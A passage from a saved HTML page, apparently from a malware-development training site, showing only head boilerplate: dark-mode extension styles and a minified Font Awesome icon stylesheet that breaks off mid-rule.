<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="23_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="23_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="23_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\